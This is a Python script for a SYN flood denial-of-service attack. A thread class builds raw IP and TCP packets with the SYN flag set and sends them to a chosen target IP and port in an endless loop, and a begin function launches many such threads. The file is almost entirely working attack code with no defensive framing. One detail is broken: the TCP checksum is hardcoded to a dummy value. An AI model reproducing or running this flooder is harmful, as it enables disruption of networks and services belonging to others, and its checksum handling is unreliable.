# Import required modules
import os
import sys
import getopt
import threading
import socket
from struct import *

# Define the synflood() class
class synflood(threading.Thread):
	# Class: synflood()
	# Purpose: Flood the target
	# Functions: __init__(), run()
	
	# Define the __init__() function
	def __init__(self, target_ip, target_port):
		# Function: __init__()
		# Purpose: Append everything to self
		
		# Append everything to self
		threading.Thread.__init__(self)
		self.target_ip = target_ip
		self.target_port = int(target_port)
		
	# Define the run() function
	def run(self):
		# Function: run()
		# Purpose: Flood the target
		
		# Create the socket
		with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as attack_socket:
			# Tell kernal not to put in headers
			attack_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
			
			# Initialize the payload
			payload = ""
			
			# Set the source and destination IPs
			source_ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
			dest_ip = self.target_ip
			
			# Set the IP header fields for the raw SYN packet
			ihl = 5 # IHL
			version = 4 # TCP Version
			tos = 0 # TOS
			tot_len = 20 + 20 # Total Length
			pack_id = 54321 # Packet ID
			frag_off = 0 # Turn fragmentation off
			ttl = 255 # Time to live
			protocol = socket.IPPROTO_TCP # Set the protocol
			check = 1 # Checksum
			saddr = socket.inet_aton (source_ip) # Set the source address
			daddr = socket.inet_aton (dest_ip) # Set the destination address
			ihl_version = (version << 4) + ihl # Set the IHL version
			
			# Pack the headers in the proper order
			ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, pack_id, frag_off, ttl, protocol, check, saddr, daddr)

			# Set the TCP header fields
			source = 1234 # Source port
			dest = self.target_port # Target port
			seq = 0 # SEQ header
			ack_seq = 0 # SEQ ACK header
			doff = 5 # DOFF
			
			# Set the TCP flags
			fin = 0 # Off
			syn = 1 # On
			rst = 0 # Off
			psh = 0 # Off
			ack = 0 # Off
			urg = 0 # Off
			window = socket.htons(5840) # Set the window
			check = 0 # Checksum
			urg_ptr = 0 # URG PTR
			
			# Pack the TCP flags
			offset_res = (doff << 4) + 0
			tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
			
			# Pack the TCP header
			tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
			
			# Set the psuedo header fields
			# pseudo header fields
			source_address = socket.inet_aton(source_ip) # The source address
			dest_address = socket.inet_aton(dest_ip) # The destination address
			placeholder = 0 # The placeholder
			protocol = socket.IPPROTO_TCP # The protocol
			tcp_length = len(tcp_header) # The packet length
			
			# Pack the psuedo headers
			psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
			psh = psh + tcp_header
			
			# Generate the checksum
			tcp_checksum = 10 # synflood.checksum(psh)
 
			# Repack the TCP headers with the correct checksum
			tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

			# Construct the full packet
			packet = ip_header + tcp_header
			
			# Create an infinite loop
			while True:
				# Flood the target
				attack_socket.sendto(packet, (dest_ip , 0 ))
				
# Define the begin() function
def begin(attack_threads, target_ip, target_port):
	# Function: begin()
	# Purpose: Create attack threads
	
	# Create the threads
	for _ in range(int(attack_threads)):
		# Create the attack thread
		attack_thread = synflood(target_ip, target_port)
		
		# Start the thread
		attack_thread.start()

